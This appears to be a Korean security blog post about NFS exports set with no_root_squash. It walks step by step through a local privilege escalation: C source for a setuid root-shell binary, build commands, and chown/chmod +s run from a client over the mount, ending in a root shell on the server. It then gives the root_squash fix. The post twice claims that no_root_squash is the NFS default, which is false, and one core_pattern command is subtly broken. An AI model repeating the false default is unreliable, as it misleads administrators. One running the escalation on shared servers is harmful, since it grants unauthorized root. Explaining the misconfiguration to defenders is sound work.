---
title: "NFS 서버 no_root_squash 세팅 취약점"
category: Security
toc: true
toc_label: "이 페이지 목차"
---

NFS 서버의 no_root_squash 설정 취약점을 이용하여 NFS 서버의 root shell을 얻는 방법을 보여준다.

## NFS 서버 설정
NFS 서버의 설정 파일인 `/etc/exports` 파일에서는 NFS export 할 경로와 옵션을 설정하는데, 이 중에서 보안 관련해서 다음 2가지 중요한 설정이 있다.
- `root_squash`: 클라이언트 호스트의 uid 0에서의 request를 서버의 uid 65534(-2)로 매핑함으로써, 지정된 호스트의 슈퍼 유저의 액세스를 거부하는 보안 기능이다. (uid 65534는 유저 nobody 임)
- `no_root_squash`: uid 0으로부터의 request를 매핑하지 않는다. 즉, client의 root는 server의 root와 같은 권한을 가진다. 이것은 디폴트로 켜져 있으므로 이것을 그대로 사용하면 보안 위험이 있다.

위와 같이 <mark style='background-color: #ffdce0'>no_root_squash</mark> 설정이 디폴트이므로, 만약에 여러 명이서 함께 사용하는 NFS 서버인 경우에는 명시적으로 <mark style='background-color: #dcffe4'>root_squash</mark> 설정을 하지 않으면, NFS 서버의 root shell을 얻을 수 있는 심각한 보안 위험이 있는데, 해킹 방법을 아래에서 예시하겠다.

> 물론 여기서는 NFS 서버에 해당 로그인 계정이 있어야 하는데, NFS 서버를 운영하는 경우는 사실상 이 경우일 것이다.

## Host에서 root shell 얻기 테스트
1. NFS 서버에서 작업하기 전에, 먼저 본인이 관리하는 서버에서 사전 테스트를 해 보자.  
   서버에서 아래와 같이 root_shell.c 파일을 작성한다.
   ```c
   #include <fcntl.h>
   #include <stdlib.h>
   #include <stdio.h>
   #include <sys/stat.h>
   #include <unistd.h>

   int main(int argc, char *argv[])
   {
       setuid(0);
       setgid(0);

       close(0);
       open("/dev/tty", O_RDWR);

       system("/bin/sh");
       return 0;
   }
   ```
1. 아래와 같이 빌드한다.
   ```sh
   $ gcc -o root_shell root_shell.c
   ```
1. 아래와 같이 해당 프로그램에 대하여 실행시 root 권한을 부여한다. (즉, **suid**(set-user-identifier) 모드 설정)
   ```sh 
   $ sudo chown root:root root_shell
   $ sudo chmod +s root_shell
   ```
   그러면 ls 명령으로 확인시 다음과 같은 속성을 확인할 수 있다. (아래에서 NFS 서버를 사용하는 경우에도 이 상태를 만드는 것이 목표임)
   ```sh
   $ ls -l root_shell
   -rwsr-sr-x 1 root     root     8480  11월 14 17:43 root_shell
   ```
1. 이제 아래와 같이 실행해서 테스트 해보면, root 권한이 얻어졌음을 확인할 수 있다.
   ```sh
   $ ./root_shell
   sh-4.4# whoami
   root
   ```

위에서 내 서버에서의 root 권한을 획득하였다.  
이제 <mark style='background-color: #ffdce0'>no_root_squash</mark> 설정의 보안 취약점을 이용하여 NFS 클라이언트에서 **suid**를 설정하고, 결과로 NFS 서버의 root 권한을 획득해 보자.

## NFS 서버 확인
NFS 서버에서 아래와 NFS export 옵션을 확인해 본다.
```sh
$ cat /etc/exports
```
위 출력 결과에서 만약에 옵션 내용에 <mark style='background-color: #ffdce0'>no_root_squash</mark>가 있거나, <mark style='background-color: #dcffe4'>root_squash</mark> 옵션이 없으면 공격 대상이다. 이 경우 아래와 같은 방법으로 root shell을 얻을 수 있다.

## no_root_squash 세팅시 root shell 얻기
1. 위의 root_shell.c 파일을 NFS 서버의 본인 계정으로 복사한 후, NFS 서버에서 마찬가지로 빌드한다.
   ```sh
   $ gcc -o root_shell root_shell.c
   ```
   빌드된 실행 파일을 NFS 디렉터리로 복사한다.
1. Target 디바이스에서 NFS 디렉터리를 마운트 한 후, 마운트 된 디렉터리로 이동한다.  
   Target 디바이스는 나에게 root 권한이 있다. 또, NFS 서버의 <mark style='background-color: #ffdce0'>no_root_squash</mark> 설정 덕분에, 아래와 같이 root_shell 프로그램의 사용자를 root로 변경하고, **suid**(set-user-identifier) 모드를 설정할 수 있다.
   ```sh
   $ sudo chown root:root root_shell
   $ sudo chmod +s root_shell
   ```
1. 이제 이 파일을 NFS 서버에서 확인해 보면 아래와 같이 사용자 및 모드가 바뀌어 있음을 확인할 수 있다.
   ```sh
   $ ls -l
   -rwsr-sr-x 1 root     root     8480  11월 14 17:50 root_shell
   ```
1. 이제 NFS 서버에서 이 파일을 실행하면 마찬가지로 root shell을 얻을 수 있다.
   ```sh
   $ ./root_shell
   sh-4.4# whoami
   root
   ```

## 올바른 NFS 서버 설정
따라서 여러 명이서 함께 사용하는 NFS 서버인 경우에는 `/etc/exports` 파일에서 명시적으로 <mark style='background-color: #dcffe4'>root_squash</mark> 설정을 해야 한다.  
<br>
참고로 이렇게 설정을 하면 NFS 클라이언트에서 root 권한으로 write가 안되므로, NFS 디렉터리에 root 권한으로 core dump 파일이 생성이 되지 않는다.  
이 경우에 NFS 디렉터리에 core dump 파일이 생성되게 하려면 다음 방법 중의 하나를 사용할 수 있겠다.
1. Target 디바이스에서 아래 예와 같이 core dump 파일이 외부 USB 저장 장치에 생성되도록 core path를 설정한다.
   ```sh
   $ sudo echo "/mnt/usb/core" > /proc/sys/kernel/core_pattern
   ```
1. NFS 서버의 마운트 디렉터리에서 아래와 같이 root 권한의 core 파일을 생성해 놓는다. (단, 관리자만 가능)
   ```sh
   $ sudo touch core
   $ sudo chmod 666 core
   ```

## 맺음말
위와 같이 NFS 서버는 설정에 따라 중대한 보안 위협이 있을 수 있다. 그런데 일부 사내 개발 서버들이 이런 위험한 NFS 설정 상태로 되어 있어서😨, 그 위험성을 알리고자 간단히 포스팅한다.
